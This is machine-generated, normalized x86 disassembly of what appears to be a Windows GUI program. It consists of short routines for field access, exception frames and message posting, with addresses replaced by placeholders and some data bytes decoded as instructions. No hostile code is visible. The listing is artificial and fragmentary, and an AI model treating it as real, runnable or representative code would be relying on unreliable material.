jmp sub_403988
sub_45704b
jmp sub_403988
sub_457052
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45706f
mov eax [ ebp - 0x14 ]
call sub_403234
retn
sub_457068
jmp sub_403988
sub_45708d
jmp sub_403988
sub_457117
jmp sub_403988
sub_45711e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457150
push ebx
mov ebx eax
mov eax ebx
call sub_41a604
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421928
sub_457214
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_457228
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_457230
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4575f5
jmp sub_403988
sub_4575fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4576fc
jmp sub_403988
sub_457703
pop ebp
retn
sub_4581fb
adc [ eax ] al
cmp al 0x2
add [ eax ] al
hlt
sub_459544
mov eax [ rw-data ]
retn
sub_45954c
mov [ rw-data ] eax
retn
sub_459694
jmp sub_4036d4
sub_4596cb
jmp sub_403988
sub_4596d2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4599da
jmp sub_403988
sub_4599e1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459a85
jmp sub_403988
sub_459a8c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459b1c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_45a248
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a8f4
sub_45a264
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_45a248
sub_45a384
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a8f4
sub_45a39c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a8f4
sub_45a3b4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45a8f4
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_45a3e0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_45a3ec
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45a8f4
retn
sub_45a6cc
push ebx
mov ebx edx
mov edx ebx
call sub_44622c
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45a73c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_45a864
jmp sub_403988
sub_45a86b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a874
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_459c80
mov eax [ ebx + 0x20c ]
call sub_459c80
sub_45a8d4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45a8e4
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45a9df
jmp sub_403988
sub_45a9ec
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45aa04
sub_45ac20
retn
sub_45ac8e
jmp sub_403988
sub_45accd
jmp sub_403988
sub_45ad00
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_447724
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_459f0c
retn
sub_45ad24
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_447744
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_459f0c
retn
sub_45ae19
jmp sub_403988
sub_45ae20
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459b74
mov eax [ ebp - 0x4 ]
call sub_45a8f4
sub_45af54
jmp sub_403988
sub_45af8c
jmp sub_403988
sub_45af93
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45afb3
lea eax [ ebp - 0x114 ]
call sub_404008
retn
sub_45afac
jmp sub_403988
sub_45afb3
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b2ba
jmp sub_403988
sub_45b2c1
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a8
sub_45b315
jmp sub_4036d4
sub_45b391
jmp sub_4036d4
sub_45b396
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b74e
jmp sub_403988
sub_45b755
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b830
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e5ec
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45b848
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b880
mov edx eax
mov eax esi
call sub_41fe74
pop esi
pop ebx
retn
sub_45b864
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45cc24
mov edx eax
mov eax esi
call sub_41fe74
pop esi
pop ebx
retn
sub_45b880
push ebx
mov ebx eax
mov eax ebx
call sub_45c8c4
mov edx r-xdata
call sub_424834
pop ebx
retn
sub_45b984
push ebx
mov ebx eax
mov eax ebx
call sub_45b994
xor al 0x1
pop ebx
retn
sub_45b994
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45b9f0
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45ba10
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45ba30
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45bd29
jmp sub_403988
sub_45bd30
pop ecx
pop ebp
retn
sub_45bd34
xor eax eax
retn
sub_45c00c
jmp sub_403988
sub_45c013
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_45c029
jmp sub_403988
sub_45c113
jmp sub_403988
sub_45c11a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c137
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_45c130
jmp sub_403988
sub_45c157
jmp sub_403988
sub_45c442
jmp sub_403988
sub_45c5d5
jmp sub_403988
sub_45c8c4
mov eax [ eax + 0x238 ]
retn
sub_45c8cc
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45c8d8
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45cc16
jmp sub_403988
sub_45cc1d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cc24
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45cc6c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_446940
sub_45cc88
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45ccc4
push ebx
mov ebx eax
mov eax ebx
call sub_4488d4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424270
sub_45cd48
push ebx
mov ebx eax
mov eax ebx
call sub_4488fc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_4248d8
sub_45cd68
push ebx
mov ebx eax
mov eax ebx
call sub_45c988
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45ca50
pop ebx
retn
sub_45d595
lea eax [ ebp - 0xb4 ]
call sub_404008
retn
sub_45d5a1
jmp sub_403988
j_sub_45d595
jmp sub_45d595
sub_45d5a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d700
jmp sub_403988
sub_45d707
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d9ec
jmp sub_403988
sub_45d9f3
mov eax [ rw-data ]
call sub_4602a4
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45da0a
add [ eax ] al
retn
sub_45dc68
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45dc88
mov eax [ eax + 0x240 ]
call sub_42a700
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_462044
sub_45dd2f
jmp sub_403988
sub_45dd36
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd59
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4248b0
retn
sub_45dd52
jmp sub_403988
sub_45dd59
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45df18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45dc88
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45e180
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_455ee8
sub_45e26b
jmp sub_403988
sub_45e272
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e278
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45da60
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45e2d0
call sub_45eff8
retn
sub_45e71d
jmp sub_403988
sub_45e724
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea20
jmp sub_4036d4
sub_45edbc
jmp sub_4036d4
sub_45eeb5
jmp sub_403988
sub_45eebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eed9
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_45eed2
jmp sub_403988
sub_45eed9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45eee0
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42a700
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45b928
sub_45ef00
call sub_403234
retn
sub_45ef58
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45efbe
jmp sub_403988
sub_45f16c
jmp sub_4036d4
sub_45f198
xor edx edx
call sub_45bc8c
retn
sub_45f1a0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_45bc8c
mov eax ebx
call sub_442e18
pop ebx
retn
sub_45f226
jmp sub_403988
sub_45f22d
pop ebx
pop ecx
pop ebp
retn
sub_45f234
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4493d8
push eax
call PostMessageA
pop ebx
retn
sub_45f438
jmp sub_403988
sub_45f4d9
jmp sub_403988
sub_45f4e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f502
mov eax [ rw-data ]
call sub_46171c
retn
sub_45f4fb
jmp sub_403988
sub_45f502
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f51f
lea eax [ ebp - 0x20 ]
call sub_404008
retn
sub_45f518
jmp sub_403988
sub_45f51f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f600
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_441fc4
retn
mov edx eax
mov eax [ rw-data ]
call sub_460d70
retn
sub_45f984
mov edx eax
mov eax [ rw-data ]
call sub_462838
mov al 0x1
retn
sub_45fa6c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45f994
sub_45fa80
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45f994
sub_45fa94
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45f994
sub_45faa8
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45f994
sub_45fabc
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45fc27
jmp sub_403988
sub_45fc2e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fc34
push ebx
mov ebx eax
mov eax ebx
call sub_447cb8
mov eax ebx
call sub_447e3c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45f234
sub_45feaa
jmp sub_403988
sub_45feb1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45feb8
push ebx
mov ebx edx
mov edx ebx
call sub_448120
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_4420cc
pop ebx
retn
sub_45ff0c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45ff74
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45ff24
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45ff74
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45ff40
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45ff74
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45ff58
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45ff74
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4601f4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460200
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46020c
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460218
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460224
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460230
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46023c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_41a468
pop esi
pop ebx
retn
sub_460250
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46026c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a468
pop esi
pop ebx
retn
sub_460280
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_460288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a468
pop esi
pop ebx
retn
sub_46029c
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_460378
mov eax [ eax + 0x54 ]
call sub_41a30c
retn
sub_460384
mov eax [ eax + 0x54 ]
call sub_41a604
retn
sub_4605d7
jmp sub_403988
sub_46061b
jmp sub_403988
sub_460622
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_460670
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460470
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40405c
pop esi
pop ebx
retn
sub_4606dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_41a468
pop esi
pop ebx
retn
sub_4606f0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4608f5
jmp sub_403988
sub_4608fc
pop ebx
mov esp ebp
pop ebp
retn
sub_460904
inc [ eax + 0x8c ]
retn
sub_46090c
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46092c
sub_46092c
xor edx edx
call sub_460d70
retn
sub_460d62
jmp sub_403988
sub_460de9
jmp sub_403988
sub_460df8
add eax 0x30
call sub_40d524
retn
sub_460e3c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_460e8d
jmp sub_4036d4
sub_460e92
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_461561
jmp sub_403988
sub_461568
pop ebx
mov esp ebp
pop ebp
retn
sub_4616f0
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46171c
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_461748
xor edx edx
call sub_461640
retn
sub_461750
mov dl 0x1
call sub_461640
retn
sub_4617c4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4617dc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4618a9
jmp sub_403988
sub_4618b0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461ffa
jmp sub_4036d4
sub_46231a
jmp sub_403988
sub_462321
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46258c
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4624f4
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_4626a0
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4626f6
jmp sub_4036d4
sub_4627dd
jmp sub_4036d4
sub_462816
jmp sub_403988
sub_46281d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462824
call sub_40d074
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_462a1d
jmp sub_403988
sub_462a24
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462aeb
jmp sub_403988
sub_462af2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462cc8
jmp sub_403988
sub_462ccf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462d30
jmp sub_403988
sub_462d37
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462d40
call sub_462b08
retn
j_sub_4036d4#9
jmp sub_4036d4
sub_462f84
jmp sub_403988
sub_462f8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4630b9
jmp sub_403988
sub_463218
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_463517
jmp sub_403988
sub_463546
jmp sub_403988
sub_463652
jmp sub_403988
sub_463659
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4639ea
jmp sub_403988
sub_4639f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463a34
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_463b64
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_463baf
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_463bc0
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_463bd0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_463c43
jmp sub_403988
sub_463c4a
pop ebp
retn
sub_463c4c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_463be0
call sub_403d58
call sub_463b64
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_459820
call sub_419f5c
sub_463cdc
retn
sub_463cdd
jmp sub_403988
j_sub_463cdc
jmp sub_463cdc
sub_463ce4
pop ebp
retn
sub_463ce8
sub [ rw-data ] 0x1
retn
sub_463f53
jmp sub_403988
sub_463fee
jmp sub_403988
sub_464014
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_463eac
call sub_4039c0
pop ebx
retn
sub_46421c
jmp sub_403988
sub_464223
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4642c8
jmp sub_403988
sub_4642cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46437a
jmp sub_403988
sub_464381
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46458c
jmp sub_403988
sub_464593
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4648ac
jmp sub_403988
sub_4648b3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4648d6
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404a70
retn
sub_4648cf
jmp sub_403988
sub_4648d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4649f4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
retn
sub_464b6d
jmp sub_403988
sub_464b74
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_464b7c
push 0x0
xor ecx ecx
call sub_464aa8
retn
sub_464b88
xor ecx ecx
mov edx 0x20
call sub_402c40
retn
sub_464e46
jmp sub_403988
sub_464e4d
pop ebp
retn
sub_464ef5
jmp sub_403988
sub_464efc
pop ebp
retn
sub_464f00
sub [ rw-data ] 0x1
retn
sub_465258
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403558
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_465338
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_46534c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_4654f8
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_4655d0
retn
sub_46571e
jmp sub_403988
sub_465725
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46572c
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_465740
mov [ eax + 0x48 ] dl
retn
sub_465744
push ebx
mov ebx eax
mov eax ebx
call sub_46572c
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_46575c
mov [ eax + 0x40 ] dl
retn
sub_465788
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_465798
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_4657cd
jmp sub_403988
sub_4657d4
pop ebp
retn
sub_4657d8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
sub_465819
jmp sub_403988
sub_465820
pop ebp
retn
sub_465824
sub [ rw-data ] 0x1
retn
sub_4658b7
add [ esp + 0x4 ] 0xfffffff0
jmp sub_466048
sub_4658c1
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405ae4
sub_4658cb
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405b0c
sub_4658e2
rcr [ eax + 0x46 ] 0x0

sub_465981
add eax 0xffffffe0
jmp sub_46655c
sub_465989
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ae4
sub_465993
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405b0c
sub_4659a7
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_4659b3
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405ae4
sub_465aa9
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ae4
sub_465ab3
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405b0c
sub_465ac7
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_465ad3
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405ae4
sub_465add
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405b0c
sub_465dbf
jmp sub_403988
sub_465dc6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465e26
jmp sub_403988
sub_465e2d
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465e77
jmp sub_403988
sub_465e7e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465f04
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_465f94
sub_465f78
jmp sub_403988
sub_465f7f
pop ebx
pop ecx
pop ebp
retn
sub_465f94
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_4642e8
lea eax [ ebx + 0xc ]
call sub_405a38
pop ebx
retn
sub_46602b
jmp sub_4036d4
sub_466030
call sub_465cb0
mov ebx eax
call sub_403a3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_466048
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_466207
jmp sub_403988
sub_466234
jmp sub_403988
sub_46623b
pop ebx
mov esp ebp
pop ebp
retn
sub_4663a9
jmp sub_403988
sub_4663d6
jmp sub_403988
sub_466529
jmp sub_403988
sub_466530
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4665a2
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_4665ab
jmp sub_403988
j_sub_4665a2
jmp sub_4665a2
sub_4665b2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466672
jmp sub_403988
sub_466679
pop ecx
pop ecx
pop ebp
retn
sub_466735
jmp sub_403988
sub_466819
jmp sub_403988
sub_466845
jmp sub_403988
sub_46690c
retn
sub_466a0e
jmp sub_403988
sub_466b60
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
pop ebx
retn
sub_466bb6
